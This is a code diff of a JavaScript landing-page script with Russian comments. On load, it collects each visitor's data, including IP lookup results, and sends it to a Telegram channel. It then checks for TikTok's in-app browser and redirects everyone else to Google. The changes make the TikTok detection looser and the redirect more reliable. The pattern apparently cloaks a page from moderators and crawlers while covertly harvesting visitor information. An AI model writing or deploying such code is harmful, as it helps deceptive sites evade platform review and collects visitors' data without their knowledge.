@@ -190,10 +190,8 @@ function isTikTokWebView() {
         hasTikTokParams
     });
     
-    return (isTikTokUA && isMobileDevice) || 
-           (hasWebViewFeatures && isMobileDevice) ||
-           (hasTikTokReferrer && isMobileDevice) ||
-           (hasTikTokParams && isMobileDevice);
+    // Возвращаем true если есть хотя бы один явный признак TikTok
+    return isTikTokUA || hasWebViewFeatures || hasTikTokReferrer || hasTikTokParams;
 }
 
 // Функция для сбора информации о посетителе
@@ -227,6 +225,8 @@ async function collectVisitorData() {
         });
     } catch (error) {
         console.error('Error fetching IP data:', error);
+        // В случае ошибки всё равно возвращаем базовые данные
+        return data;
     }
 
     return data;
@@ -319,25 +319,26 @@ ${uniqueStatus}
 
 // Улучшенная основная функция обработки
 async function handleVisitor() {
-    const visitorData = await collectVisitorData();
-    await sendToTelegram(visitorData);
-    
-    // Увеличенная задержка и двойная проверка
-    setTimeout(() => {
-        const isTikTok = isTikTokWebView();
+    try {
+        const visitorData = await collectVisitorData();
+        await sendToTelegram(visitorData);
         
-        setTimeout(() => {
-            const secondCheck = isTikTokWebView();
-            console.log('TikTok Detection Results:', {
-                firstCheck: isTikTok,
-                secondCheck: secondCheck
-            });
-            
-            if (!isTikTok && !secondCheck) {
-                window.location.href = 'https://www.google.com/';
-            }
-        }, 100);
-    }, 1000);
+        // Проверяем, является ли это TikTok WebView
+        const isTikTok = isTikTokWebView();
+        console.log('Is TikTok WebView:', isTikTok);
+        
+        // Если это НЕ TikTok WebView, делаем редирект
+        if (!isTikTok) {
+            setTimeout(() => {
+                console.log('Redirecting to Google...');
+                window.location.replace('https://www.google.com/');
+            }, 500);
+        }
+    } catch (error) {
+        console.error('Error in handleVisitor:', error);
+        // В случае ошибки всё равно делаем редирект
+        window.location.replace('https://www.google.com/');
+    }
 }
 
 // Запуск скрипта при загрузке страницы
